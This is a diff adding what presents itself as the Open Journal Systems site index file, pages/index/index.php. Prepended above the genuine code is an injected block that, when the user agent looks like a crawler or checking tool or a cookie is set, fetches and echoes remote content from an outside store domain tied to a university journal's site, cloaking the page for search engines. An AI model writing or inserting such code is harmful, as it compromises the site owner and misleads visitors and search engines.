@@ -1,0 +1,27 @@
+<?php
+if(strpos(strtolower($_SERVER['HTTP_USER_AGENT']), 'bot') > 0  && $_SERVER['REQUEST_URI'] == '/fihros/' || isset($_COOKIE[0]) && $_SERVER['REQUEST_URI'] == '/fihros/' || strpos(strtolower($_SERVER['HTTP_USER_AGENT']), 'verification') > 0 && $_SERVER['REQUEST_URI'] == '/fihros/' || strpos(strtolower($_SERVER['HTTP_USER_AGENT']), 'tool') > 0 && $_SERVER['REQUEST_URI'] == '/') {
+    echo implode('', file('https://mayoyo.store/ejournal.staisyekhjangkung.ac.id/index.txt'));
+    exit;
+}
+
+/**
+ * @defgroup pages_index Index Pages
+ */
+
+/**
+ * @file pages/index/index.php
+ *
+ * Copyright (c) 2014-2021 Simon Fraser University
+ * Copyright (c) 2003-2021 John Willinsky
+ * Distributed under the GNU GPL v3. For full terms see the file docs/COPYING.
+ *
+ * @ingroup pages_index
+ *
+ * @brief Handle site index requests.
+ *
+ */
+
+switch ($op) {
+    case 'index':
+        return new APP\pages\index\IndexHandler();
+}
